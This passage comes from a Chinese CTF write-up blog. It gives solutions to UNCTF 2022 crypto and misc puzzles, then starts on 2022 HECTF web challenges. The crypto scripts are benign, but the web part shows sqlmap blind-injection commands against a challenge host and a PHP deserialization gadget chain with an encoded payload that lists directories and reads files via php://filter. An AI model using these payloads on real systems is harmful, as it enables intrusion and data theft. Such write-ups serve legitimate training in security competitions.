a4238a0b923820dcc509a6f75849bc9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122ccbb184dd8e05c9709e5dcaedaa0495cf&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)s = list(range(32,127))t = &#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()] = chr(k)flag=&#x27;&#x27;for k in c: flag += t[k]print(flag)# UNCTF&#123;e84fed028b9046fc0e8f080e96e72184&#125; ​ dddd1换为 .，0换为 -，摩斯密码解密得：UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;。 ​ caesarROT64变种凯撒密码，用脚本还原： 123456789101112131415161718import strings = &#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;dic = string.ascii_uppercase+string.ascii_lowercase+string.digits+&#x27;+/&#x27;print(dic)d = ord(&#x27;U&#x27;)-ord(&#x27;B&#x27;)t = &#x27;&#x27;for i in range(len(s)): if s[i] == &#x27;&#123;&#x27; or s[i] == &#x27;&#125;&#x27; or s[i] == &#x27;_&#x27;: t += s[i] else: t += dic[(dic.index(s[i])+d)%64]print(t)# UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar_&#125; ​ md5-2比md5-1多了一层异或操作，还原即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151ebc1fd731c6d60040369908b4a5f309f4180fdc84bbb5ed9e207a21d5436efdcfdb48d19bb99a7e6bb448f63b75bc9238439eaf918a52fcaa5ed9195e546b021c1795d6869f32db43ff5b414de3c235514f59a054403f933c842e9c3235c136367c80b37816048952a3c0fc9780602a2fa810ecef68e945c3fe7d6accba8b329bdcad06891e0c769c7b02c228c8c2c8865470a96d253a639193530a15487fea36f470a96d253a639193530a15487fea36f4bdea6676e5335f857fa8e47249fa1d8810ecef68e945c3fe7d6accba8b329bdedbb7ab78cde98a07b9b5a2ab284bf0a44b43e07e9af05e3b9b129a287e5a8dfa641c08ed66b55c9bd541fe1b22ce5c0abed1f675819a2c0f65c9b7da8cab301738c486923803a1b59ef17329d70bbbd7e209780adf2cd1212e793ae8796ed7ca641c08ed66b55c9bd541fe1b22ce5c0a641c08ed66b55c9bd541fe1b22ce5c0636a84a33e1373324d64463eeb8e76146ec65b4ab061843b066cc2a2f16820d5a4a39b59eb036a4a8922f7142f8741148c34745bd5b5d42cb3efe381eeb88e4b5b1ba76b1d36847d632203a75c4f74e2d861570e7b9998dbafb38c4f35ba08bc464b7d495dc6019fa4a709da29fc79528eb69528cd84b73d858be0947f97b7ccdd6ac4c783a9059d11cb0910fc95d4a4b6b0ee5d5f6b24e6898997d765c487cb0762bc356c466d6b2b8f6396f2e0418547287408e2d2d8f3834fc1b90c3be982947a7d007b9854fa62efb18c9fd91f8ddafe43b36150de851c83d80bd22b0ac7b36c5f23587e285e528527d1263c8b2a0816e8af86e68825c9df0d63a2838163ce72a42cf62e6d0fdc6c96df4687e3&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)cc = [int(k,16) for k in c]for i in range(1,len(cc)): cc[i] ^= cc[i-1] cc = [hex(k)[2:].rjust(32,&#x27;0&#x27;) for k in cc]print(cc)s=list(range(32,127))t=&#123;&#125;for k in s: t[md5(chr(k).encode()).hexdigest()]=chr(k)flag = &#x27;&#x27;for k in cc: flag += t[k]print(flag)# UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125; ​ ezRSA常规RSA。 1234567891011import gmpy2n = 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561e = 65537c = 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504p = gmpy2.iroot(n,4)[0]f = p**3*(p-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27; ​ Single table读加密方式，明显的playfair密码。 按照key排列好字母表，手动把每两个字母取出解密后，排列为 UNCTFGODYOUKNOWPLAYFAIRX，在适当的地方加符号分割单词：UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;。 ​ Multi table变表维吉尼亚密码，先根据前4字符确定key值，再遍历爆破。 1234567891011121314151617181920212223242526272829303132333435from string import ascii_uppercasebase_table = [&#x27;J&#x27;, &#x27;X&#x27;, &#x27;I&#x27;, &#x27;S&#x27;, &#x27;E&#x27;, &#x27;C&#x27;, &#x27;R&#x27;, &#x27;Z&#x27;, &#x27;L&#x27;, &#x27;U&#x27;, &#x27;K&#x27;, &#x27;Q&#x27;, &#x27;Y&#x27;, &#x27;F&#x27;, &#x27;N&#x27;, &#x27;V&#x27;, &#x27;T&#x27;, &#x27;P&#x27;, &#x27;O&#x27;, &#x27;G&#x27;, &#x27;A&#x27;, &#x27;H&#x27;, &#x27;D&#x27;, &#x27;W&#x27;, &#x27;M&#x27;, &#x27;B&#x27;]table=&#123;&#125;for i in range(26): table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]ori = &#x27;UNCT&#x27;res = &#x27;SDCG&#x27;key = []for i in range(4): for k,v in table.items(): if v[base_table.index(ori[i])] == res[i]: key.append(k) breakprint(key)c = &#x27;SDCGW&#123;MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD&#125;&#x27;flag = &#x27;&#x27;x = 0for i in range(len(c)): if c[i] in ascii_uppercase: now = table[key[x%4]].index(c[i]) flag += base_table[now] x += 1 else: flag += c[i]print(flag)# [9, 15, 23, 16]# UNCTF&#123;WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER&#125; ​ babyRSA泄露 $m$ 高位的Coppersmith攻击。 1234567891011121314n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107e = 6 mbar = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240kbits = 60nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor = nm = mbar + x0print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;&#x27; ​ easy_RSA泄露 $p$ 高位的Coppersmith攻击。 12345678910111213141516171819c = 6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553p4 = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857e = 0x10001pbits = 512kbits = 200print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)p = p4+int(roots[0]) q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# flag&#123;It is a very_intersting_test!!!&#125; ​ ezxor 你知道多次一密吗？ 多次一密（MTP）攻击。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# python2import stringimport collectionsimport sets, sysciphers = &#x27;&#x27;&#x27;1c2063202e1e795619300e164530104516182d28020005165e01494e0d2160631d325b3b421c310601453c190814162d37404510041b55490d5d3060631d325b3e59033a1252102c560207103b22020613450549444f5d3420277421122f55067f1207152f19170659282b090b56121701405318212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a75222a22230877102137045212300409165928264c091f131701484f5d21272d33661237441a7f005215331706175930254c0817091b4244011c303c2674311e795e103a05520d300600521831274c031f0b160148555d3c3d63232909355455300752033a17175e59372c1c0056111d01474813752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)def strxor(a, b): return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; final_key = [None]*150 known_key_positions = set() for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() for index, ciphertext2 in enumerate(ciphers): if current_index != index: for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 knownSpaceIndexes = [] for ind, val in counter.items(): if val &gt;= 7: knownSpaceIndexes.append(ind) xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) known_key_positions.add(index) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; print &#x27;------end------&#x27; for i in ciphers: target_fix(i) 补全可能的明文单词，反复尝试得到key：UNCTF&#123;Y0u_are_very_Clever!!!&#125;。 ​ 今晚吃什么 全部大写 10000 换 A，00000 换 B，培根密码解得 CRYPROISFUN。 ​ Today_is_Thursday_V_me_50按代码逻辑还原即可。 1234567891011121314151617181920212223242526272829import randomimport itertoolsfrom Crypto.Util.number import *from Crypto.Util.strxor import strxorname = &quot;unctf&quot;key1 = b&#x27;Today_is_Thursday_V_me_50&#x27;key1_num = bytes_to_long(key1)c = b&#x27;Q\\x19)T\\x18\\x1b(\\x03\\t^c\\x08QiF&gt;Py\\x124DNg3P&#x27;random.seed(key1_num)message = b&#x27;&#x27;for i in c: temp_num = random.randint(1,128) message += long_to_bytes(temp_num ^ i)guess = [i for i in itertools.permutations(name, 5)]for i in range(4): what = guess.pop(50)name = &#x27;&#x27;.join(j for j in what)mask = strxor(5*name.encode(),key1)print(mask)out = strxor(mask,message)print(out)# b&#x27;unctf&#123;1_l0ve_Thurs4Ay!!!&#125;&#x27; ​ Fermat已知 $g+x=x \\cdot p$，则 $g=x(p-1)$，结合费马小定理，有 $a^g \\bmod p = a^{ x(p-1)} \\bmod p = (a^x)^{(p-1)} \\bmod p = 1$ （$a$ 为任意整数） 取 $a=2$，即 $2^g \\bmod p = 1$，$2^g-1=k_1p$， 而 $2^g \\bmod p = (2^g \\bmod n) \\bmod p=1$，则 $2^g \\bmod n = 1+k_2p$， 故 $(2^g \\bmod n)-1=k_2p$ 也是 $p$ 的倍数，则有 $p=\\gcd\\Big((2^g \\bmod n)-1,n\\Big)$。 12345678910111213n = 19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259c = 388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059g = 28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160e = 0x10001p = gcd(pow(2,g,n)-1,n)q = n//pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,n)print(bytes.fromhex(hex(m)[2:]))# b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27; ​ 超级加倍根据”加倍“，脑洞大猜小指数 $e$ 攻击，开方即可。 123456import gmpy2c=364948328635256862807658970246807356738683637564484151183420122283833769442806688034764747801289594899501872549412387392353830842750341246881725380294423193634163908298756097744423833369487321345708403908358587818931161805853745707954962941881920962518131654701890269025702523666873057795301975752113492236398361724355733200822450695761m=gmpy2.iroot(c,4)[0]print(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;it_is_much_bigger_than_before&#125;&#x27; ​ EZcry 提示1：流密码 密文：dd9f58b37289edc2c40133ab9f0439c140aafe7cfd501f8c3d79b1856c9bda598ce34a02a57c， key：12345678 根据提示测试常见流密码，RC4成功解出 flag&#123;83e429d991d24c548b9dbd256975d0d5&#125;。 ​ easy_lfsr 你能求出我的mask吗 根据512级LFSR连续1024个bit的产出，求掩码。 由于LFSR的性质，每一次生成的bit都会加到向量的最低位，同时丢弃掉最高位bit。于是在连续512次生成之后，原有的 KEY 所有的位都被丢弃，LFSR的状态会转为已知的512个bit，即所给出的串的前512位。之后完全知道了LFSR的状态，只需要在已知状态的情况下推出掩码。 每连续512个bit可以生成下一个bit。已知这512个 bit，也知道下一个bit，但掩码未知。问题等价于：在 $\\text{GF}(2)$ 上，512位的已知的状态向量，点乘512位的掩码向量，得到的数已知，求掩码向量。状态向量有512维，则有512组方程。 解方程组的问题转化为矩阵求逆问题。把LFSR状态逐行写在矩阵上，形成的矩阵记为 $M$，把LFSR每次所生成的结果拼成的向量记为 $T$，则掩码向量 $v$ 有：$M \\cdot v = T$，即 $v=M^{-1} \\cdot T$。 123456789101112131415161718192021222324import itertoolsr1 = 1261758973831852037364036680281442789461569523587512977925542995725854499352478233840720068310447535900840104847512878006505600998481136843381903570688446r2 = 1563853949934744587783542352813857485182445023523734908403585490477271641971239139925690033798570364214960692427704824920072270819031456154655408096237757def test(): s = [int(x) for x in bin(r1)[2:].rjust(512,&#x27;0&#x27;)+bin(r2)[2:].rjust(512,&#x27;0&#x27;)] M = matrix(GF(2), 512, 512) T = vector(GF(2), 512) for i in range(len(s) - 512): M[i] = s[i : i + 512] T[i] = s[i+512] try: mask = M.inverse() * T return int(&#x27;&#x27;.join(map(str, (mask))),2) except: return flag = test()print(bytes.fromhex(hex(flag)[2:]))# b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\\xb0vgf\\x96\\xdf`v\\xc6d@\\x14\\xf7\\x98\\xaf\\xac&#x27;\\xf8K\\xbb+\\x00&quot; ​ # Miscmagic_word 乱码+零宽隐写 Wingdings字体转正常字体如宋体，全选内容复制，零宽隐写工具提取得 unctf&#123;We1come_new_ctfer&#125;。 ​ 找得到我吗以压缩包方式打开docx，在document.xml中发现： &lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt; ​ syslog在log文件中找到关键一行： Nov 2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA== base64解码得到密码 password is U6nu2_i3_b3St，解压得flag：unctf&#123;N1_sH3_D0n9_L0g_dE!&#125; ​ In_the_Morse_GardenPDF中全选复制出文字： 1234567891011121314UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaE=&#125; 中间部分base64解码得到的 依古比古 换为 .，玛卡巴卡 换为 -，再摩斯密码解得 WAN_AN_MAKA_BAKAAAAA!。 ​ 清和fan 小w一直对真人二次元没啥抵抗力，当他见到清和的时候，小w直呼这就是心动的感觉。 第一层，根据压缩包注释，密码为清和B站uid下划线最高播放量视频发布日期，找到密码 836885_2022/05/20； 第二层，png图片LSB隐写，提取出 password is :qq857488580； 第三层，音频文件SSTV，得到图片中密码 V@mpir3； 最后一层，文本内零宽隐写，用在线工具提取得到 unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;。 ​ 芝麻开门带密码的LSB隐写：python2 lsb.py extract flag.png xxx.txt key1 flag: flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125; ​ 我小心海也绝非鳝类png图片中有字符串 F#S&lt;YIcHnAG;，base92解码 flaginmd5；尾部 RUFTWUxTQg==，base64解码 EASYLSB。 zsteg查看不到有用信息，用cloaked-pixel带密码的LSB提取：python2 lsb.py extract 1.png out.txt flaginmd5，得到： 18FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF 根据前面的提示，这串字符串为md5值的组合，爆破： 12345678910111213141516from hashlib import md5s = &#x27;8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF&#x27;.lower()s = [s[32*i:32*i+32] for i in range(len(s)//32)]dic = &#123;&#125;for k in range(32,127): dic[md5(chr(k).encode()).hexdigest()] = chr(k)flag = &#x27;&#x27;for k in s: flag += dic[k]print(flag)# flag&#123;welcome_to_misc&#125; ​ MY PICTURE将dat文件异或0x8e，解压得到encode.py，内为图片加密算法，逻辑为逐像素RGB值简单异或，还原即可： 12345678910111213141516from PIL import Imagec = Image.open(r&#x27;flag.png&#x27;,&#x27;r&#x27;)l,h = c.sizeprint(l,h)m = Image.new(&#x27;RGB&#x27;,(h,l))for i in range(l): for j in range(h): r1,g1,b1 = c.getpixel((i,j)) r = g1^b1 g = r1^r b = g1^g m.putpixel(((i*1200+j)//787,(i*1200+j)%787),(b,g,r))m.save(r&#x27;flag.jpg&#x27;)c.close()m.close() 还原图片中的flag：UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;。 ​ 贝斯家族的侵略 提示1：如果明文攻击失败，尝试使用bandzip 提示2：会动的鼠标 第一层，根据提示1，bandzip压缩后明文攻击，解压； 第二层，base64隐写，脚本提取隐写内容： 123456789101112# -*- coding: utf-8 -*-b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = &#x27;&#x27;.join(line.split()) rowb64 = &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split()) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])) #8 位一组 得到的内容16进制转字符串，得到一个文件； 第三层，根据文件内的提示 Macro.mrf，猜测为鼠标轨迹记录，使用Macro Recorder工具打开，逐条查看轨迹得到flag：flag&#123;b4s3_1s_v3ry_g0od!!&#125;。 ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022 HECTF","slug":"match-2022-HECTF","date":"2022-11-07T13:38:28.000Z","updated":"2022-11-28T16:24:14.457Z","comments":true,"path":"2022/11/07/match-2022-HECTF/","permalink":"https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/","excerpt":"","text":"​ 2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。 Rank: 1 Web迷路的小狮 签到题 HINTS: 官网地址需填写完整(建议复制)，无路径即结尾为.cn 进入是迷惑性的404页面，且右键和F12禁用，地址栏手动添加 view-source: 看到源码提示 hectfer。 访问 /hectfer 提示 hebnu is a good site.，访问 /hebnu 提示 Can you use another way of requesting? 上burpsuite，按提示按步骤修改request header的几处为： 1234POST /hebnu HTTP/1.1User-Agent: Internet ExplorerReferer: https://www.hebtu.edu.cnX-Forwarded-For: 127.0.0.1 在responce header里看到PHPFuck代码，控制台运行直接得到flag：HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;。 ​ 擎天注找到GET参数id，用sqlmap可以直接通过时间盲注跑出flag。 命令： 12345678# 爆数据库名sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; --dbs# 数据库名ctf，爆表名sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf --tables# 数据库名ctf，表名3eDf4f07efC9ee16，爆列名和内容sqlmap -u &quot;http://121.4.111.50:32614/?id=1&quot; -D ctf -T 3eDf4f07efC9ee16 --columns --dump ​ easy_unserialize 一道神奇的反序列化题 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;?phperror_reporting(0);class A&#123; public $file; public function __construct()&#123; echo &quot;Welcome to HECTF Have fun!!!😊&lt;br&gt;&quot;; &#125; public function __wakeup()&#123; if(isset($this-&gt;file-&gt;var))&#123; $this-&gt;file = &quot;flag.php&quot;; &#125; else&#123; $this-&gt;file = &quot;index.php&quot;; &#125; &#125; public function __destruct()&#123; highlight_file($this-&gt;file); &#125;&#125;class B&#123; public $str; public $huang; public function __isset($arg) &#123; echo &quot;难道我真的要失败了，吗&quot;.$this-&gt;str; &#125; public function __call($fun1,$arg) &#123; return $this-&gt;huang-&gt;str; &#125;&#125;class C&#123; public $eee; public $aaa=&quot;who are you?&quot;; public $ccc; public function __toString() &#123; $this-&gt;eee-&gt;flag(); &#125; public function __get($css) &#123; $function = $this-&gt;ccc; return $function(); &#125;&#125;class D&#123; private $ddd; private $ext; public function flag()&#123; $this-&gt;ext-&gt;nisa($this-&gt;ddd); &#125; public function __invoke() &#123; echo new $this-&gt;ddd($this-&gt;ext); &#125;&#125;$gagaga = new A();unserialize(serialize($gagaga));$data = $_POST[&#x27;data&#x27;];unserialize($data); 构造反序列化链： A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new() 利用内置类 DirectoryIterator + glob://伪协议列目录： 12345678910111213141516171819202122232425262728293031323334353637from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;DirectoryIterator&#x27; private_ext = &#x27;glob:///*f*&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: public_ccc = &#x27;?&#x27; public_eee = D() public_aaa = &#x27;?&#x27;class B: public_str = C() public_huang = &#x27;?&#x27; class A: public_file = B()print(quote(serialize(A())))# POST payload:# data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D# 文件名 /ffflllllaaaaaaggggg.txt 再利用内置类 SplFileObject + php://filter伪协议读文件内容： 1234567891011121314151617181920212223242526272829303132333435363738from phpserialize import serializefrom urllib.parse import quoteclass D: private_ddd = &#x27;SplFileObject&#x27; private_ext = &#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27; class C: public_ccc = D() public_eee = &#x27;?&#x27; public_aaa = &#x27;?&#x27; class B: public_str = &#x27;?&#x27; public_huang = C() class D: private_ddd = &#x27;?&#x27; private_ext = B()class C: 